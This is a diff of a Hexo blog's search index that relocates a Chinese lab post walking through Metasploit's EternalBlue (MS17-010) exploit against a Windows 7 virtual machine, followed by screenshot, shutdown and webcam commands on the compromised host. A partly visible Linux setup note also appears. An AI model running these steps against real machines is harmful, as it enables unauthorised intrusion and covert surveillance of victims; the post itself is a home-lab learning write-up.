@@ -1,47 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>第一次攻击实验</title>
-    <url>/2020/04/15/ok/</url>
-    <content><![CDATA[<p>实验:metasploit下利用”永恒之蓝”攻击win7<br>(准备阶段，win7虚拟机，kali linux系统)<br>实验声明:网络不是法外之地~~</p>
-<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>初次使用 –&gt; msfdb init/reinit<br>开启数据库 –&gt; sudo service postgresql start</p>
-<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5><p><img src="https://wx2.sbimg.cn/2020/04/15/p0.jpg" alt=""></p>
-<h5 id="搜索cve17-010相关的exp"><a href="#搜索cve17-010相关的exp" class="headerlink" title="搜索cve17-010相关的exp"></a>搜索cve17-010相关的exp</h5><p>输入 –&gt; search ms17-010<br><img src="https://wx1.sbimg.cn/2020/04/15/p1.png" alt=""></p>
-<h5 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h5><p>输入 –&gt; use auxiliary/scanner/smb/smb_ms17_010<br>使用options查看参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p2.png" alt=""></p>
-<h5 id="关键来了，找了win7的IP，"><a href="#关键来了，找了win7的IP，" class="headerlink" title="关键来了，找了win7的IP，"></a>关键来了，找了win7的IP，</h5><p>输入 –&gt; set RHOSTS 192.168.XXX.XXX<br>接着 –&gt; run<br><img src="https://wx2.sbimg.cn/2020/04/15/p3.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p4.png" alt=""></p>
-<p>接着 –&gt; use exploit/windows/smb/ms17_010_eternalblue<br>使用options查看相关参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p5.png" alt=""></p>
-<p>然后 –&gt; set RHOSTS 192.168.XXX.XXX (靶机的IP)</p>
-<h5 id="查看payload"><a href="#查看payload" class="headerlink" title="查看payload"></a>查看payload</h5><p>show payloads<br><img src="https://wx1.sbimg.cn/2020/04/15/p6.png" alt=""></p>
-<h5 id="使用payload"><a href="#使用payload" class="headerlink" title="使用payload"></a>使用payload</h5><p>set payload (号数)<br>使用options查看payload要的参数<br><img src="https://wx2.sbimg.cn/2020/04/15/p7.png" alt=""></p>
-<p>*设置本机IP –&gt; set LHOST 192.168.XXX.XXX</p>
-<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>exploit<br><img src="https://wx2.sbimg.cn/2020/04/15/p8.png" alt=""><br><img src="https://wx1.sbimg.cn/2020/04/15/p9.png" alt=""></p>
-<p>然后就可以进行截屏、关机、开摄像头等操作了,嘿嘿<br>截屏 –&gt; screenshot<br>关机 –&gt; shutdown<br>开摄像头 –&gt; webcam_scream<br><img src="https://wx2.sbimg.cn/2020/04/15/p10.png" alt=""></p>
-<p>以下则是小实验的“偷窥”成果<br><img src="https://wx1.sbimg.cn/2020/04/15/p11.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p12.png" alt=""></p>
-<p>老板觉得博文勉强过得去记得三连嘿，爱宁哟</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <tags>
-        <tag>experiment</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>note_1</title>
     <url>/2020/04/27/note-1/</url>
     <content><![CDATA[<h3 id="Linux系统搭建配置-1-软件入门（真-·-水文章）"><a href="#Linux系统搭建配置-1-软件入门（真-·-水文章）" class="headerlink" title="Linux系统搭建配置 1.. 软件入门（真 · 水文章）"></a>Linux系统搭建配置 1.. 软件入门（真 · 水文章）</h3><p>（以Ubuntu为例）</p>
@@ -107,6 +66,47 @@
       </script>]]></content>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第一次攻击实验</title>
+    <url>/2020/04/15/ok/</url>
+    <content><![CDATA[<p>实验:metasploit下利用”永恒之蓝”攻击win7<br>(准备阶段，win7虚拟机，kali linux系统)<br>实验声明:网络不是法外之地~~</p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>初次使用 –&gt; msfdb init/reinit<br>开启数据库 –&gt; sudo service postgresql start</p>
+<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5><p><img src="https://wx2.sbimg.cn/2020/04/15/p0.jpg" alt=""></p>
+<h5 id="搜索cve17-010相关的exp"><a href="#搜索cve17-010相关的exp" class="headerlink" title="搜索cve17-010相关的exp"></a>搜索cve17-010相关的exp</h5><p>输入 –&gt; search ms17-010<br><img src="https://wx1.sbimg.cn/2020/04/15/p1.png" alt=""></p>
+<h5 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h5><p>输入 –&gt; use auxiliary/scanner/smb/smb_ms17_010<br>使用options查看参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p2.png" alt=""></p>
+<h5 id="关键来了，找了win7的IP，"><a href="#关键来了，找了win7的IP，" class="headerlink" title="关键来了，找了win7的IP，"></a>关键来了，找了win7的IP，</h5><p>输入 –&gt; set RHOSTS 192.168.XXX.XXX<br>接着 –&gt; run<br><img src="https://wx2.sbimg.cn/2020/04/15/p3.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p4.png" alt=""></p>
+<p>接着 –&gt; use exploit/windows/smb/ms17_010_eternalblue<br>使用options查看相关参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p5.png" alt=""></p>
+<p>然后 –&gt; set RHOSTS 192.168.XXX.XXX (靶机的IP)</p>
+<h5 id="查看payload"><a href="#查看payload" class="headerlink" title="查看payload"></a>查看payload</h5><p>show payloads<br><img src="https://wx1.sbimg.cn/2020/04/15/p6.png" alt=""></p>
+<h5 id="使用payload"><a href="#使用payload" class="headerlink" title="使用payload"></a>使用payload</h5><p>set payload (号数)<br>使用options查看payload要的参数<br><img src="https://wx2.sbimg.cn/2020/04/15/p7.png" alt=""></p>
+<p>*设置本机IP –&gt; set LHOST 192.168.XXX.XXX</p>
+<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>exploit<br><img src="https://wx2.sbimg.cn/2020/04/15/p8.png" alt=""><br><img src="https://wx1.sbimg.cn/2020/04/15/p9.png" alt=""></p>
+<p>然后就可以进行截屏、关机、开摄像头等操作了,嘿嘿<br>截屏 –&gt; screenshot<br>关机 –&gt; shutdown<br>开摄像头 –&gt; webcam_scream<br><img src="https://wx2.sbimg.cn/2020/04/15/p10.png" alt=""></p>
+<p>以下则是小实验的“偷窥”成果<br><img src="https://wx1.sbimg.cn/2020/04/15/p11.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p12.png" alt=""></p>
+<p>老板觉得博文勉强过得去记得三连嘿，爱宁哟</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <tags>
+        <tag>experiment</tag>
       </tags>
   </entry>
   <entry>
